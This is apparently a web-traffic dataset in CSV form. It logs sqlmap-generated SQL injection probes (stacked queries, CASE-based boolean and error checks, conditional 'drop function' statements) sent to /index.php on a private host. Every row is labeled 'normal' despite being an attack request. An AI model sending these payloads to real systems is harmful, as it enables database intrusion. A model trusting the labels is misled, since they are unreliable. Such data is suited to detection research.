/,,*/* close,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%"")));select * from generate_series(9446,9446,case when (9446=9446) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%"";select * from generate_series(9446,9446,case when (9446=9446) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"") where 6073=6073;select * from generate_series(8374,8374,case when (8374=4095) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php) where 6812=6812;select * from generate_series(1700,1700,case when (1700=6285) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' where 6978=6978;select * from generate_series(1290,1290,case when (1290=7933) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"" where 8848=8848;select * from generate_series(6769,6769,case when (6769=2907) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"" where 4252=4252;select * from generate_series(9446,9446,case when (9446=9446) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php where 2260=2260;select * from generate_series(6531,6531,case when (6531=8815) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php'||(select 'sddf' from dual where 9093=9093;select * from generate_series(6176,6176,case when (6176=8222) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php'||(select 'ukjp' from dual where 3461=3461;select * from generate_series(9446,9446,case when (9446=9446) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php'||(select 'xndt' where 7662=7662;select * from generate_series(9446,9446,case when (9446=9446) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' (select okyr where 8434=8434;select * from generate_series(9446,9446,case when (9446=9446) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' (select 'evgt' where 2656=2656;select * from generate_series(4446,4446,case when (4446=6148) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' (select 'utta' where 8584=8584;select * from generate_series(9446,9446,case when (9446=9446) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"")) as bcam where 6490=6490;select * from generate_series(6669,6669,case when (6669=4013) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"")) as xpja where 4716=4716;select * from generate_series(9446,9446,case when (9446=9446) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php') as ongv where 4630=4630;select * from generate_series(9446,9446,case when (9446=9446) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"") as hqwa where 1657=1657;select * from generate_series(9446,9446,case when (9446=9446) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php) as vgeq where 7064=7064;select * from generate_series(3105,3105,case when (3105=1884) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php) as qbuk where 2879=2879;select * from generate_series(9446,9446,case when (9446=9446) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php` where 6829=6829;select * from generate_series(1780,1780,case when (1780=5046) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php` where 3447=3447;select * from generate_series(9446,9446,case when (9446=9446) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php`) where 6081=6081;select * from generate_series(9446,9446,case when (9446=9446) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' in boolean mode);select * from generate_series(9446,9446,case when (9446=9446) then 1 else 0 end) limit 1-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php);if(4266=4388) select 4266 else drop function qnjy-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php');if(4280=6636) select 4280 else drop function jyak-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php';if(4887=5754) select 4887 else drop function nxgw-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php';if(6359=6359) select 6359 else drop function aicf-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"";if(9617=8436) select 9617 else drop function siyv-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"";if(6359=6359) select 6359 else drop function aicf-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php));if(8095=1816) select 8095 else drop function citc-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php)));if(9832=7531) select 9832 else drop function ward-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php;if(9321=6270) select 9321 else drop function btyr-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php'));if(7509=1362) select 7509 else drop function puiu-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php'));if(6359=6359) select 6359 else drop function aicf-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"");if(9809=2827) select 9809 else drop function ivgx-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php""));if(6359=6359) select 6359 else drop function aicf-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"")));if(4740=2472) select 4740 else drop function acap-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%');if(7158=1702) select 7158 else drop function kksp-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%'));if(8024=4383) select 8024 else drop function edph-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%')));if(3534=8272) select 3534 else drop function lffq-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%')));if(6359=6359) select 6359 else drop function aicf-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%';if(2819=5960) select 2819 else drop function kltj-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%"")));if(8555=8202) select 8555 else drop function phpd-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%"")));if(6359=6359) select 6359 else drop function aicf-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%"";if(3264=6360) select 3264 else drop function eepv-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php') where 8077=8077;if(9048=5077) select 9048 else drop function gumc-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"") where 1951=1951;if(6359=6359) select 6359 else drop function aicf-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php) where 2586=2586;if(7127=8784) select 7127 else drop function qlcj-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' where 5813=5813;if(6359=6359) select 6359 else drop function aicf-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php where 1533=1533;if(7836=8630) select 7836 else drop function cqhf-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php'||(select 'lfmx' from dual where 2234=2234;if(5292=8741) select 5292 else drop function gsvc-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php'||(select 'nlcp' where 8894=8894;if(1061=2277) select 1061 else drop function hivz-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' (select daem where 2131=2131;if(6359=6359) select 6359 else drop function aicf-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' (select 'lgcu' where 3823=3823;if(6359=6359) select 6359 else drop function aicf-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php')) as tksj where 7753=7753;if(6359=6359) select 6359 else drop function aicf-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"")) as dryb where 6477=6477;if(6831=3062) select 6831 else drop function kixe-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"")) as afei where 8487=8487;if(6359=6359) select 6359 else drop function aicf-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php)) as xjfk where 9867=9867;if(6359=6359) select 6359 else drop function aicf-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php') as yrpr where 4047=4047;if(1344=6777) select 1344 else drop function canm-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"") as erkc where 3952=3952;if(5017=7499) select 5017 else drop function fmsq-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php) as qcsj where 3743=3743;if(7731=9856) select 7731 else drop function alix-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php`) where 5350=5350;if(8363=5431) select 8363 else drop function gazg-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' in boolean mode);if(1453=6191) select 1453 else drop function otbz-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php);select (case when (4646=4261) then 1 else 4646*(select 4646 union all select 4261) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php');select (case when (4580=4580) then 1 else 4580*(select 4580 union all select 8452) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php';select (case when (4580=4580) then 1 else 4580*(select 4580 union all select 8452) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"";select (case when (4580=4580) then 1 else 4580*(select 4580 union all select 8452) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php));select (case when (4580=4580) then 1 else 4580*(select 4580 union all select 8452) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php;select (case when (5931=5940) then 1 else 5931*(select 5931 union all select 5940) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php;select (case when (4580=4580) then 1 else 4580*(select 4580 union all select 8452) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php'));select (case when (1193=6476) then 1 else 1193*(select 1193 union all select 6476) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php'));select (case when (4580=4580) then 1 else 4580*(select 4580 union all select 8452) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php')));select (case when (4580=4580) then 1 else 4580*(select 4580 union all select 8452) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"");select (case when (3009=5079) then 1 else 3009*(select 3009 union all select 5079) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"");select (case when (4580=4580) then 1 else 4580*(select 4580 union all select 8452) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"")));select (case when (2957=4590) then 1 else 2957*(select 2957 union all select 4590) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%'));select (case when (9688=5696) then 1 else 9688*(select 9688 union all select 5696) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%'));select (case when (4580=4580) then 1 else 4580*(select 4580 union all select 8452) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%';select (case when (4789=6083) then 1 else 4789*(select 4789 union all select 6083) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%"");select (case when (6962=5568) then 1 else 6962*(select 6962 union all select 5568) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%""));select (case when (4580=4580) then 1 else 4580*(select 4580 union all select 8452) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%"")));select (case when (4580=4580) then 1 else 4580*(select 4580 union all select 8452) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php') where 7726=7726;select (case when (4580=4580) then 1 else 4580*(select 4580 union all select 8452) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"") where 6178=6178;select (case when (4580=4580) then 1 else 4580*(select 4580 union all select 8452) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php) where 4634=4634;select (case when (6097=3250) then 1 else 6097*(select 6097 union all select 3250) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' where 8210=8210;select (case when (4977=7268) then 1 else 4977*(select 4977 union all select 7268) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' where 2895=2895;select (case when (4580=4580) then 1 else 4580*(select 4580 union all select 8452) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php where 9149=9149;select (case when (4580=4580) then 1 else 4580*(select 4580 union all select 8452) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php'||(select 'wtai' from dual where 6828=6828;select (case when (4938=2299) then 1 else 4938*(select 4938 union all select 2299) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php'||(select 'pkex' where 5609=5609;select (case when (9047=9011) then 1 else 9047*(select 9047 union all select 9011) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php'||(select 'ajwt' where 4732=4732;select (case when (4580=4580) then 1 else 4580*(select 4580 union all select 8452) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' (select yvfx where 2252=2252;select (case when (4580=4580) then 1 else 4580*(select 4580 union all select 8452) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' (select 'fcdh' where 1294=1294;select (case when (4580=4580) then 1 else 4580*(select 4580 union all select 8452) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"")) as omxx where 2791=2791;select (case when (4580=4580) then 1 else 4580*(select 4580 union all select 8452) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php)) as wxpx where 4370=4370;select (case when (4580=4580) then 1 else 4580*(select 4580 union all select 8452) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"") as knjs where 7016=7016;select (case when (3638=8260) then 1 else 3638*(select 3638 union all select 8260) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"") as xnrw where 3736=3736;select (case when (4580=4580) then 1 else 4580*(select 4580 union all select 8452) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php) as ddng where 4579=4579;select (case when (4580=4580) then 1 else 4580*(select 4580 union all select 8452) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php` where 9641=9641;select (case when (4225=7254) then 1 else 4225*(select 4225 union all select 7254) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php`) where 6049=6049;select (case when (3968=4978) then 1 else 3968*(select 3968 union all select 4978) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php' in boolean mode);select (case when (7627=3750) then 1 else 7627*(select 7627 union all select 3750) end)-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php);select (case when (6491=2249) then 6491 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php');select (case when (7117=2039) then 7117 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php';select (case when (4193=2178) then 4193 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"";select (case when (4040=4040) then 4040 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php)));select (case when (2564=9880) then 2564 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php;select (case when (4040=4040) then 4040 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php'));select (case when (1642=7198) then 1642 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php'));select (case when (4040=4040) then 4040 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php')));select (case when (8729=1438) then 8729 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php')));select (case when (4040=4040) then 4040 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"");select (case when (7138=3466) then 7138 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"");select (case when (4040=4040) then 4040 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php""));select (case when (9158=5562) then 9158 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php""));select (case when (4040=4040) then 4040 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"")));select (case when (4959=6911) then 4959 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php"")));select (case when (4040=4040) then 4040 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%'));select (case when (5893=4636) then 5893 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%')));select (case when (3678=4703) then 3678 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%';select (case when (9608=3499) then 9608 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%';select (case when (4040=4040) then 4040 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%"");select (case when (3288=4416) then 3288 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%""));select (case when (5814=9729) then 5814 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%"")));select (case when (7517=7312) then 7517 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
/index.php,,"*/* gzip,deflate close http://192.168.175.220:80/index.php%"")));select (case when (4040=4040) then 4040 else cast(1 as int)/(select 0 from dual) end) from dual-- sqlmap/1.2.4#stable (http://sqlmap.org)",edfs sdwa,normal
